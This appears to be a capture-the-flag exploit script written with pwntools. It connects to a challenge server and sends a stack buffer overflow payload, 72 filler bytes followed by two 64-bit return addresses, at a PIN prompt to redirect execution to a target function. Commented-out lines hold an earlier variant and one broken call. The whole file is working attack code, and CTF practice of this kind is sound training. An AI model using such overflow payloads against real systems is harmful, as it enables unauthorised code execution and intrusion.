from pwn import *

host = "challs2.nusgreyhats.org"
port = 30211

remote = connect(host, port)

payload = b'A' * 72 + p64(0x000000000040101a) + p64(0x000000000040138e)

print(remote.recvuntil(b"PIN: "))

remote.sendline(payload)
print(remote.recvall(10))

# payload = b'A' * 40 + p64(0x0000000000401236)
# remote.sendline(payload)
# print(remote.recv(ls))
# remote.interactive()